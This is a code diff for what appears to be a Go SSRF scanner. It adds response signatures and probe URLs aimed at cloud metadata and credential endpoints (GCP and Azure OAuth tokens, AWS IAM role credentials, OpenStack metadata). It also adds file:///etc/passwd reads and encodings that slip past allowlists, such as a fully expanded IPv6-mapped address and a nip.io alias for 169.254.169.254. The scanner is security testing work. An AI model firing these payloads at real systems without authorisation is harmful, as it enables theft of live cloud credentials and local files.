@@ -71,6 +71,30 @@ var ssrfMetadataSignatures = []*regexp.Regexp{
 	// Oracle Cloud Infrastructure (http://169.254.169.254/opc/v2/instance/)
 	regexp.MustCompile(`(?i)"compartmentId"\s*:`),
 	regexp.MustCompile(`(?i)"availabilityDomain"\s*:`),
+	// OpenStack / CloudStack config-drive metadata (meta_data.json over the shared
+	// 169.254.169.254). Gated by the same baseline+two-control differential as
+	// every signature here, so an app that legitimately returns the field is not
+	// flagged (the field appears in its control response too).
+	regexp.MustCompile(`(?i)"availability_zone"\s*:`),
+	// OAuth access-token metadata routes (GCP service-account token, Azure managed-
+	// identity token, and any IMDS token endpoint). The token-response shape —
+	// "access_token" immediately followed by "expires_in" — is the single
+	// highest-impact SSRF confirmation (it hands the attacker a live cloud
+	// credential). No brace can appear between the two keys in a flat token JSON,
+	// so the [^}]* stays inside the same object; if it can't, the match simply
+	// fails closed (no false positive). The double-confirm + two controls below
+	// still gate it.
+	regexp.MustCompile(`(?i)"access_token"\s*:\s*"[^"]+"[^}]*"expires_in"\s*:`),
+	// Kubernetes API server / kubelet read (SSRF into the cluster control plane).
+	// A *List response names a Kubernetes resource kind that no ordinary web
+	// application API ever returns, so this is unambiguous.
+	regexp.MustCompile(`(?i)"kind"\s*:\s*"(PodList|SecretList|NodeList|ServiceAccountList|NamespaceList|ConfigMapList|EndpointsList)"`),
+	// file:// scheme SSRF → local file disclosure. The /etc/passwd root line is a
+	// deterministic Unix marker. A page that merely DOCUMENTS a passwd sample would
+	// carry the same line in the baseline and both controls, so the differential
+	// gate below rejects it — only a response that gains the line via our injected
+	// file:// value is confirmed.
+	regexp.MustCompile(`(?m)^root:.*:0:0:`),
 }
 
 // ssrfPayloadHostMarkers are strings that only exist because WE put the metadata
@@ -82,6 +106,7 @@ var ssrfPayloadHostMarkers = []string{
 	"2852039166",
 	"::ffff:169.254",
 	"::ffff:a9fe:a9fe",
+	"ffff:a9fe:a9fe", // also matches the fully-expanded 0:0:0:0:0:ffff:a9fe:a9fe form
 	"0251.0376.0251.0376",
 	"0xa9fea9fe",
 	"metadata.google.internal",
@@ -132,6 +157,27 @@ var ssrfInbandPayloads = []struct{ url, note string }{
 	// resolves both to the identical address.
 	{"http://[::ffff:a9fe:a9fe]/latest/meta-data/", "AWS IMDS (IPv4-mapped IPv6, hex form)"},
 	{"http://1684301000/latest/meta-data/", "Alibaba Cloud metadata (decimal IP)"},
+	// ── High-impact token routes (a confirmed hit hands over a LIVE cloud
+	// credential, not just an instance-metadata listing) ──
+	{"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "GCP service-account OAuth token"},
+	{"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "Azure managed-identity OAuth token"},
+	{"http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default", "AWS IAM role credential document"},
+	// ── file:// local file disclosure via SSRF (server fetches a local path) ──
+	{"file:///etc/passwd", "Local file read via file:// SSRF"},
+	// ── Additional allowlist-bypass encodings of the metadata IP ──
+	// Fully-expanded IPv6-mapped form (no "::" compression) — an allowlist that
+	// only normalizes the compressed "::ffff:" form misses this, while the socket
+	// layer resolves it to the same 169.254.169.254.
+	{"http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/", "AWS IMDS (fully-expanded IPv4-mapped IPv6)"},
+	// DNS-wildcard host that publicly resolves to the metadata IP — defeats a
+	// hostname allowlist that never checks the RESOLVED address (SSRF's most common
+	// real-world filter bypass).
+	{"http://169.254.169.254.nip.io/latest/meta-data/", "AWS IMDS (nip.io DNS alias of the metadata IP)"},
+	// OpenStack / CloudStack config drive over the shared metadata IP.
+	{"http://169.254.169.254/openstack/latest/meta_data.json", "OpenStack metadata"},
+	// GCP recursive dump of the entire instance tree (tokens, ssh keys, attributes)
+	// in one request — the broadest single GCP SSRF proof.
+	{"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json", "GCP full recursive metadata"},
 }
 
 // redirectChainMetaTargets is the small set of metadata URLs tried through
@@ -407,8 +453,13 @@ func (s *SSRFScanner) fetch(ctx context.Context, ip insertionPoint, payload stri
 	if strings.Contains(payload, "metadata.google.internal") {
 		req.Header.Set("Metadata-Flavor", "Google")
 	}
-	if strings.Contains(payload, "/metadata/instance") {
-		req.Header.Set("Metadata", "true") // Azure IMDS requires this exact header
+	// Azure IMDS requires this exact header on EVERY /metadata route — the instance
+	// document AND the identity/oauth2/token endpoint. Matching only /metadata/instance
+	// silently 400'd the token probe (a missing-header rejection reads as "no SSRF"),
+	// so the highest-impact Azure route — the live managed-identity credential — was
+	// a false negative. Match the shared /metadata/ prefix instead.
+	if strings.Contains(payload, "169.254.169.254/metadata/") || strings.Contains(payload, "/metadata/identity") {
+		req.Header.Set("Metadata", "true")
 	}
 	// OCI IMDSv2 expects Authorization on the server-side metadata request. Do
 	// not set it on this outer request: that would overwrite the target's real
